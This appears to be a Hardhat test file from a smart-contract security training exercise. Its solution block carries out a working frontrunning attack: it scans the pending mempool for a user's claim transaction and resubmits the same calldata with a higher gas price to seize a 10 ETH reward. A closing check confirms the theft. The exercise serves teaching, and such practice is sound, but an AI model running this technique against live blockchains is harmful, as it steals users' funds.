const { ethers } = require('hardhat');
const { expect } = require('chai');
const { keccak256 } = require('ethers/lib/utils');

let deployer, user, attacker;

describe('Frontrunning Attack Exercise 1', function () {
  before(async function () {
    /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

    [deployer, user, attacker] = await ethers.getSigners();
    this.attackerInitialBalance = await ethers.provider.getBalance(
      attacker.address,
    );

    const findMeContract = await ethers.getContractFactory(
      'contracts/frontrunning-1/FindMe.sol:FindMe',
      deployer
    );
    this.findMe = await findMeContract.deploy({
      value: ethers.utils.parseEther('10'),
    });

    const obfuscatedString = atob('RXRoZXJldW0=');
    await this.findMe.connect(user).claim(obfuscatedString);
  });

  it('Exploit', async function () {
    /** CODE YOUR SOLUTION HERE */

    // TODO: Get all the tx's in the mempool
    const pendingBlock = await ethers.provider.send("eth_getBlockByNumber", [
      "pending",
      true,
    ]);

    // TODO: Find the tx that is being sent fron the user to the FindMe contract
    let transaction = pendingBlock.transactions.find(
      (tx) => tx.to.toLowerCase() == this.findMe.address.toLowerCase()
    );

    // TODO: Send the same tx with more gas
    await attacker.sendTransaction({
      to: transaction.to,
      data: transaction.input,
      gasPrice: ethers.BigNumber.from(transaction.gasPrice).add(1),
      gasLimit: transaction.gas,
    });

  });

  after(async function () {
    
    // Mine all the transactions
    await ethers.provider.send('evm_mine', []);

    // Check if the attacker have in his balance at leat 9.9 more eth than what he had before
    const attackerBalance = await ethers.provider.getBalance(attacker.address);
    expect(attackerBalance).to.be.gt(
      this.attackerInitialBalance.add(ethers.utils.parseEther('9.9')),
    );
  });
});
